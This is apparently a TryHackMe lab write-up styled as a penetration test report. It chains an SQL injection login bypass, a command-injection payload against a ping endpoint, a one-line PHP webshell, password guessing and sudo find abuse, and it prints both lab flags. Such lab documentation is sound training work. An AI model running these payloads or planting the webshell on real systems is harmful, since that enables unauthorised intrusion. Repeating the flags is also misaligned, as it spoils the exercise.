Operation Promotion — Penetration Test Report

TryHackMe Easy · 2026-06-02

Target: RecruitCorp (10.67.169.54) Date: 2026-06-02 Objective: Chain exploits to capture /home/jford/user.txt and /root/flag.txt

The Operation Promotion engagement targeted the RecruitCorp careers portal. The /admin/ login was bypassed via SQL injection, exposing the application's SQLite database and a network diagnostics endpoint vulnerable to command injection that provided RCE as www-data. A password hash recovered from the configuration files was cracked using a context-derived password (spring2026!). The resulting jford account had passwordless sudo access to find, which was abused to read the root flag.

2. Web Application Exploitation

2.1 SQL Injection — Admin Login

The /admin/ login page was vulnerable to SQL injection in the username field:

Username: admin'--
Password: (anything)

The backend query:

SELECT id, username FROM users WHERE username='$u' AND password='$p'

Evidence:

curl -s 'http://10.67.169.54/admin/index.php' \
  -d 'username=admin%27--&password=x'

2.2 Admin Dashboard — User Enumeration

Logged in as admin. Dashboard provided a User Lookup feature (paramterized, not injectable) and a sysmaint notes entry pointing to:

/admin/sysmaint-checks/ping.php

2.4 Command Injection — ping.php

The sysmaint ping endpoint was vulnerable to command injection:

http://10.67.169.54/admin/sysmaint-checks/ping.php?host=127.0.0.1;id

Backend:

shell_exec("ping -c 1 -W 1 $host 2>&1")

Placed a webshell at /var/www/html/webshell.php for persistent RCE as www-data:

<?php system($_GET["cmd"]); ?>

3. Password Discovery

3.1 Bcrypt Hash Discovery

Found in /var/www/html/config/db.conf:

db_user=jford
db_pass_hash=$2b$10$QzkXmGndA2cQLozO3xAN6eWKrl6ZXyzhYTJNF67exOmTmN5oVSEfq

3.2 Cracking Approach

Initial attempts with a generated wordlist (10067 entries including pw_jf_0000–pw_jf_9999) failed. CPU-based bcrypt cost-10 cracking was impractical (~36 H/s).

Solution: Derived from contextual keywords on the company website — "Spring 2026 Hiring Drive" — combined with the pattern keyword + year + !:

spring2026!

This password was not in any standard wordlist but was constructed from visible web content.

Verification:

echo 'spring2026!' | su -c 'id' jford

4. Privilege Escalation

4.1 User Flag — /home/jford/user.txt

THM{bdbee0a91ebcb0b0fafde931223efe09}

4.2 Root Escalation — Sudo Find

jford had passwordless sudo on /usr/bin/find:

(root) NOPASSWD: /usr/bin/find

Used sudo find to read the root flag directly:

echo 'spring2026!' | su -c 'sudo /usr/bin/find /dev/null -exec cat /root/flag.txt \;' jford

4.3 Root Flag — /root/flag.txt

THM{d999a1f6319a9c5b48c067dfab314ba2}

5. Summary

Step Technique Result
1 SQLi on admin login (admin'--) Admin panel access
2 Extracted SQLite database 9 user credentials
3 Command injection in ping.php RCE as www-data
4 Contextual password guessing (spring2026!) jford access
5 sudo /usr/bin/find (NOPASSWD) Root shell

Remediation Recommendations

  • Use parameterized queries for authentication (SQLi vector)
  • Validate/sanitize shell command input (RCE vector)
  • Avoid password hashes in config files readable by www-data
  • Remove unnecessary sudo privileges (sudo find → root)
  • Enforce password complexity policy that prevents simple keyword + year + symbol patterns
